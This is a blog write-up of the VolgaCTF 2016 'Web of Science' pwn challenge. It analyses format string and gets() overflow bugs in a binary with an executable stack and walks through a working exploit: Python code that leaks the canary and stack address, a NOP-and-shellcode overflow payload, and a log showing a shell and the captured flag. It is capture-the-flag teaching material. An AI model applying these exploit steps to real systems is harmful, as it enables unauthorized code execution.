<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content=BlahCats name=author><meta content="Tales of a binary encoded life..." name=description><meta prefix="og: http://ogp.me/ns#" content=BlahCats property=og:site_name><meta prefix="og: http://ogp.me/ns#" content=blog property=og:type><meta content="VolgaCTF 2016 - Web of Science" prefix="og: http://ogp.me/ns#" property=og:title><meta content="VolgaCTF 2016 - Web of Science - by hugsy" prefix="og: http://ogp.me/ns#" property=og:description><meta prefix="og: http://ogp.me/ns#" content=en_US property=og:locale><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/2016-03-28-volgactf-2016-web-of-science property=og:url><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/img/blog-cover.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@ctf_blahcat name=twitter:site><meta content=BlahCats name=twitter:title><meta content="VolgaCTF 2016 - Web of Science - by hugsy" name=twitter:description><meta content=https://blahcat.github.io/2016-03-28-volgactf-2016-web-of-science name=twitter:url><meta content=https://blahcat.github.io/img/blog-cover.png name=twitter:image:src><script type=application/ld+json>
    {
      "@context" : "http://schema.org",
      "@type" : "Website",
      "name": " BlahCats",
      "url" : "https://blahcat.github.io/2016-03-28-volgactf-2016-web-of-science",
      
      "image": https://blahcat.github.io/img/blog-cover.png",
      
      
      "description": VolgaCTF 2016 - Web of Science - by hugsy",
      
    }
    </script><title>
  VolgaCTF 2016 - Web of Science
</title><link href=https://blahcat.github.io/img/favicon.ico rel=icon type=image/x-icon><link href=https://blahcat.github.io/css/bootstrap.min.css rel=stylesheet><link href=" https://blahcat.github.io/css/all.min.css" rel=" stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Montserrat:400,300" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lato" -- <!-- custom for rel=stylesheet styles template this><link href=https://blahcat.github.io/css/clean-blog.css rel=stylesheet><link href=https://blahcat.github.io/css/overrides.css rel=stylesheet><link integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css referrerpolicy=no-referrer rel=stylesheet><body><nav class="navbar navbar-expand-lg navbar-light fixed-top" id=mainNav><div class=container><a class=navbar-brand href=https://blahcat.github.io>BlahCats Blog</a><button aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right" aria-controls=navbarResponsive aria-expanded=false data-target=#navbarResponsive data-toggle=collapse type=button>Menu <i class="fas fa-bars"></i></button><div class="collapse navbar-collapse" id=navbarResponsive><ul class="navbar-nav ml-auto"><li class=nav-item><a class=nav-link href=https://blahcat.github.io>Home</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/series>Series</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/notes>Notes</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/about>About</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/qemu>Qemu VMs</a></ul></div></div></nav><header class=masthead style=background-image:url(https://blahcat.github.io/img/blog-cover.png)><div class=overlay></div><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><div class=post-heading><h1>VolgaCTF 2016 - Web of Science</h1><span class=meta> <b> • <a href=/author/hugsy>hugsy</a> • </b> 28 March 2016 <br> <br> <i>Reading time: 5 min</i> </span></div></div></div></div></header><article><article class=post><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><h3 id=info>Info</h3><pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>gef➤</span><span>  !file ./web_of_science
</span><span style=color:#bf616a>./web_of_science:</span><span> ELF 64-bit LSB executable, x86-64, version 1 (SYSV)</span><span style=color:#bf616a>,</span><span> dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID</span><span style=color:#b48ead>[</span><span>sha1</span><span style=color:#b48ead>]</span><span>=85e0df26435ee411258ad39668c9700b1ebadec9, stripped
</span><span style=color:#bf616a>gef➤</span><span>  checksec
</span><span style=color:#bf616a>[+]</span><span> checksec for '</span><span style=color:#a3be8c>/home/hugsy/ctf/volgactf_2016/web_of_science</span><span>'
</span><span style=color:#bf616a>Canary:</span><span>                                           Yes
</span><span style=color:#bf616a>NX</span><span> Support:                                       No
</span><span style=color:#bf616a>PIE</span><span> Support:                                      No
</span><span style=color:#bf616a>RPATH:</span><span>                                            No
</span><span style=color:#bf616a>RUNPATH:</span><span>                                          No
</span><span style=color:#bf616a>Partial</span><span> RelRO:                                    Yes
</span><span style=color:#bf616a>Full</span><span> RelRO:                                       No
</span></code></pre><p>It’s a simple dynamically linked binary for x86-64. We have a canary stack however the stack is executable (the ’90s says hello!), which <code>gef</code> confirms instantly: <a href=https://i.imgur.com/LfT3dt1.png target=_blank> <img alt=exec-stack src=https://i.imgur.com/LfT3dt1.png title=exec-stack width=100%> </a><h3 id=vulnerabilities>Vulnerabilities</h3><p><code>web_of_science</code> is a tool to manage scientific papers. The binary is full of vulnerabilities, many of which were automatically detected by the <code>format-string-helper</code> command from <a rel="noopener nofollow noreferrer" href=https://github.com/hugsy/gef.git target=_blank>GDB-GEF</a></p><a href=https://i.imgur.com/cqYmZLi.png target=_blank> <img alt=fmt-str-gef src=https://i.imgur.com/cqYmZLi.png title=fmt-str-gef width=100%> </a><p>Without any static analysis, we immediately spot that many (if not all) <code>printf()</code> calls are vulnerable to format string vulnerabilities, where we control the format field. That’s good, we can leverage that later to bypass the canary protection. So far, so good ☺<p>So what does the binary do? It starts by call the function at 0x04007CD which checks if we are human by prompting us to solve an addition with randomly generated integers. Pretty hardcore stuff, right?<p>Then we jump into serious business at 0x400E1C. The function offers a menu to respectively add/delete/list/view papers and exit.<p>When adding a paper (<code>add_paper()</code> function), a stack buffer of 1096 bytes is allocated on the stack. It is then possible to populate different fields of this stack allocated paper as shown here:</p><a href=https://i.imgur.com/dTZmTgS.png target=_blank> <img alt=add-paper-fill-info src=https://i.imgur.com/dTZmTgS.png title=add-paper-fill-info width=100%> </a><p>When saving the stack buffer is then copied to the .bss segment:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>.text:0000000000400BAD</span><span> loc_400BAD:                             ; </span><span style=color:#bf616a>DATA</span><span> XREF: .rodata:0000000000401240
</span><span style=color:#bf616a>.text:0000000000400BAD</span><span>                 mov     eax, cs:nb_papers
</span><span style=color:#bf616a>.text:0000000000400BB3</span><span>                 cdqe
</span><span style=color:#bf616a>.text:0000000000400BB5</span><span>                 shl     rax, 6
</span><span style=color:#bf616a>.text:0000000000400BB9</span><span>                 mov     rdx, rax
</span><span style=color:#bf616a>.text:0000000000400BBC</span><span>                 shl     rdx, 4
</span><span style=color:#bf616a>.text:0000000000400BC0</span><span>                 add     rax, rdx
</span><span style=color:#bf616a>.text:0000000000400BC3</span><span>                 add     rax, offset base_papers
</span><span style=color:#bf616a>.text:0000000000400BC9</span><span>                 mov     rdx, rax
</span><span style=color:#bf616a>.text:0000000000400BCC</span><span>                 lea     rsi, </span><span style=color:#b48ead>[</span><span>rbp+paper</span><span style=color:#b48ead>]
</span><span style=color:#bf616a>.text:0000000000400BD3</span><span>                 mov     eax, 88h
</span><span style=color:#bf616a>.text:0000000000400BD8</span><span>                 mov     rdi, rdx
</span><span style=color:#bf616a>.text:0000000000400BDB</span><span>                 mov     rcx, rax
</span><span style=color:#bf616a>.text:0000000000400BDE</span><span>                 rep movsq               ; </span><span style=color:#bf616a>memcpy</span><span>(base_paper</span><span style=color:#b48ead>[</span><span>i</span><span style=color:#b48ead>]</span><span>, paper_stack)
</span><span style=color:#bf616a>.text:0000000000400BE1</span><span>                 mov     eax, cs:nb_papers
</span><span style=color:#bf616a>.text:0000000000400BE7</span><span>                 add     eax, 1          ; </span><span style=color:#bf616a>increments</span><span> the number of paper
</span><span style=color:#bf616a>.text:0000000000400BEA</span><span>                 mov     cs:nb_papers, eax
</span><span style=color:#bf616a>.text:0000000000400BF0</span><span>                 jmp     short loc_400BF9
</span></code></pre><p>One stricking thing is of course the massive use of <code>gets()</code> everywhere for user input. So we think immediately to stack-based buffer overflow.<p>The <code>view_paper()</code> function (at 0x400D52) receives a pointer to a paper and displays its information using <code>printf()</code> - which makes us understand what triggered the <code>gef</code> plugin for format string.</p><a href=https://i.imgur.com/f7hs6qZ.png target=_blank> <img alt=view-paper src=https://i.imgur.com/f7hs6qZ.png title=view-paper width=100%> </a><h3 id=exploitation>Exploitation</h3><p>The exploitation process will go something like this:<ol><li>Use of the format string vulnerabilities to leak stack until we get the canary using <code>printf()</code><li>Overflow one of the stack allocated buffer using <code>gets()</code>, correctly insert the canary, and jump to our stack-based shellcode.</ol><p>So this lines up the following sequential steps:<ul><li>Create a paper to allocate a 1096 byte stack buffer</ul><pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>Adding a paper</span><span>")
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>> </span><span>")
</span><span>    s.</span><span style=color:#bf616a>write</span><span>("</span><span style=color:#a3be8c>1</span><span style=color:#96b5b4>\n</span><span>") </span><span style=color:#65737e># add_paper
</span><span>
</span><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>Adding paper name</span><span>")
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>> </span><span>")
</span><span>    s.</span><span style=color:#bf616a>write</span><span>("</span><span style=color:#a3be8c>1</span><span style=color:#96b5b4>\n</span><span>") </span><span style=color:#65737e># add_paper_name
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>Paper name: </span><span>")
</span><span>    s.</span><span style=color:#bf616a>write</span><span>('</span><span style=color:#a3be8c>A</span><span>'*</span><span style=color:#d08770>10</span><span>+"</span><span style=color:#96b5b4>\n</span><span>")
</span></code></pre><ul><li>Using the abstract field of the paper to store our format string to leak the canary, and the stack address (for returning to it).</ul><pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>Adding paper abstract</span><span>")
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>> </span><span>")
</span><span>    s.</span><span style=color:#bf616a>write</span><span>("</span><span style=color:#a3be8c>3</span><span style=color:#96b5b4>\n</span><span>") </span><span style=color:#65737e># add_paper_abstract
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>Paper abstract: </span><span>")
</span><span>    s.</span><span style=color:#bf616a>write</span><span>("</span><span style=color:#a3be8c>%7$p.%163$p</span><span>" + "</span><span style=color:#96b5b4>\n</span><span>")
</span></code></pre><p>A stack address was found at <code>"$7$p"</code> and the canary at <code>"%163$p"</code>.<ul><li>We need to view the paper to actually trigger the format string information leak:</ul><pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>> </span><span>")
</span><span>    s.</span><span style=color:#bf616a>write</span><span>("</span><span style=color:#a3be8c>5</span><span style=color:#96b5b4>\n</span><span>") </span><span style=color:#65737e># view_paper_info
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>Abstract:</span><span style=color:#96b5b4>\n\t</span><span>")
</span><span>    paper_addr, canary = s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#96b5b4>\n</span><span style=color:#a3be8c>Tags:</span><span style=color:#96b5b4>\n\t</span><span>")[:-</span><span style=color:#d08770>8</span><span>].</span><span style=color:#bf616a>split</span><span>('</span><span style=color:#a3be8c>.</span><span>', </span><span style=color:#d08770>1</span><span>)
</span><span>    paper_addr = </span><span style=color:#bf616a>int</span><span>(paper_addr, </span><span style=color:#d08770>16</span><span>)
</span><span>    canary = </span><span style=color:#bf616a>int</span><span>(canary, </span><span style=color:#d08770>16</span><span>)
</span><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>Got addr: </span><span style=color:#d08770>%#x</span><span>" % paper_addr)
</span><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>Got canary: </span><span style=color:#d08770>%#x</span><span>" % canary)
</span></code></pre><ul><li>And now, build our payload, overflow the buffer, insert the canary to get good karma, and make the <code>ret</code> at 0x400C0E fall back to our controlled buffer:</ul><pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>> </span><span>")
</span><span>    s.</span><span style=color:#bf616a>write</span><span>("</span><span style=color:#a3be8c>1</span><span style=color:#96b5b4>\n</span><span>") </span><span style=color:#65737e># add_paper_name
</span><span>    </span><span style=color:#bf616a>ok</span><span>("</span><span style=color:#a3be8c>Sending payload</span><span>")
</span><span>    payload = ""
</span><span>    payload+= "</span><span style=color:#96b5b4>\x90</span><span>"*</span><span style=color:#d08770>0x8
</span><span>    payload+= </span><span style=color:#bf616a>SC
</span><span>    payload+= "</span><span style=color:#96b5b4>\x90</span><span>"*(</span><span style=color:#d08770>1096</span><span>-</span><span style=color:#96b5b4>len</span><span>(payload))
</span><span>    payload+= </span><span style=color:#bf616a>q_s</span><span>(canary) + "</span><span style=color:#a3be8c>JUNK</span><span>"*</span><span style=color:#d08770>2 </span><span>+ </span><span style=color:#bf616a>q_s</span><span>(paper_addr)
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>Paper name: </span><span>")
</span><span>    s.</span><span style=color:#bf616a>write</span><span>(payload + '</span><span style=color:#96b5b4>\n</span><span>')
</span><span>
</span><span>    s.</span><span style=color:#bf616a>read_until</span><span>("</span><span style=color:#a3be8c>> </span><span>")
</span><span>    s.</span><span style=color:#bf616a>write</span><span>("</span><span style=color:#a3be8c>6</span><span style=color:#96b5b4>\n</span><span>") </span><span style=color:#65737e># quit to trigger the ret
</span></code></pre><p>And the execution gives:<pre class=language-bash data-lang=bash style=color:#c0c5ce;background-color:#2b303b><code class=language-bash data-lang=bash><span style=color:#bf616a>~/ctf/volgactf_2016</span><span> $  ./gef-exploit.py
</span><span style=color:#bf616a>[+]</span><span> Connected to webofscience.2016.volgactf.ru:45678
</span><span style=color:#bf616a>[+]</span><span> Passing checks
</span><span style=color:#bf616a>[+]</span><span> Adding a paper
</span><span style=color:#bf616a>[+]</span><span> Adding paper name
</span><span style=color:#bf616a>[+]</span><span> Adding paper abstract
</span><span style=color:#bf616a>[+]</span><span> Showing paper to leak the canary
</span><span style=color:#bf616a>[+]</span><span> Got addr: 0x7fffffffe6e0
</span><span style=color:#bf616a>[+]</span><span> Got canary: 0x675049f6baf95300
</span><span style=color:#bf616a>[+]</span><span> Sending payload
</span><span style=color:#bf616a>[+]</span><span> Got it, interacting (Ctrl-C to break)
</span><span style=color:#bf616a>[+]</span><span> Get a PTY with '</span><span style=color:#a3be8c> python -c "import pty;pty.spawn(</span><span>'/bin/bash'</span><span style=color:#a3be8c>)"  </span><span>'
</span><span>
</span><span style=color:#bf616a>python -c </span><span>"</span><span style=color:#a3be8c>import pty;pty.spawn('/bin/bash')</span><span>"
</span><span style=color:#bf616a>nobody@scweb1:/opt$</span><span> ls
</span><span style=color:#bf616a>flag_wos.txt</span><span>  install  start_wos  web_of_science
</span><span style=color:#bf616a>nobody@scweb1:/opt$</span><span> cat flag_wos.txt
</span><span style=color:#bf616a>VolgaCTF{executable_st@ck_doesnt_cause_@ny_problems_d0es_it</span><span>}
</span></code></pre><p>All done mate !<h3 id=conclusion>Conclusion</h3><p>Final word (or image):</p><a href=https://i.imgur.com/PjfFC2f.jpg target=_blank> <img alt=image_alt src=https://i.imgur.com/PjfFC2f.jpg title=image_alt width=100%> </a><p>Full exploit is : <a rel="noopener nofollow noreferrer" href=https://gist.github.com/hugsy/deae32e1da40e7b8c754 target=_blank>gef-exploit.py</a><p>A write-up for <code>web_of_science_2</code> might as well come soon, stay tuned…<aside class=post-tags><p>Categories: <a href=https://blahcat.github.io/categories/ctf/>#ctf</a><p>Tags: <a href=https://blahcat.github.io/tags/pwn/>#pwn</a> <a href=https://blahcat.github.io/tags/volgactf-2016/>#volgactf-2016</a> <a href=https://blahcat.github.io/tags/x86/>#x86</a></aside><aside class=post-discussion>Join the Discussion on <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=VolgaCTF 2016 - Web of Science" target=_blank> <i class="fab fa-github fa-lg"></i> GitHub </a></aside><aside class=post-nav><div class=container><div class=row><div class=col><b>Next:</b><br><a class=post-nav-prev href=https://blahcat.github.io/2016-04-01-hitb-teaser-2016-bakery/> <section class=post-nav-teaser><b class=post-nav-title>HITB 2016 - Bakery write-up</b><p class=post-nav-excerpt>I participated to HITB Teaser CTF only to have a bit of fun with there pwna…</section> </a></div><div class=col><b>Previous:</b><br><a class=post-nav-next href=https://blahcat.github.io/2016-03-22-bctf-16-ruin/> <section class=post-nav-teaser><b class=post-nav-title> BCTF 2016 - Ruin</b><p class=post-nav-excerpt>This is an ARM 32b exploitation challenge part of the BCTF competition, whi…</section> </a></div></div></div></aside></div></div><hr><footer><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><ul class="list-inline text-center"><li class=list-inline-item><a href=https://blahcat.github.io/atom.xml> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fas fa-rss fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://twitter.com/ctf_blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-twitter fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://github.com/blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-github fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-youtube fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://discord.gg/hSbqxxBgRX> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-discord fa-stack-1x fa-inverse"></i> </span> </a></ul><p class="copyright text-muted">Made with ❤ with Zola</div></div></div></footer><script src=https://blahcat.github.io/js/jquery.min.js></script><script src=https://blahcat.github.io/js/bootstrap.bundle.min.js></script><script src=https://blahcat.github.io/js/clean-blog.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js></script><div class=mermaidTooltip style=opacity:0></div>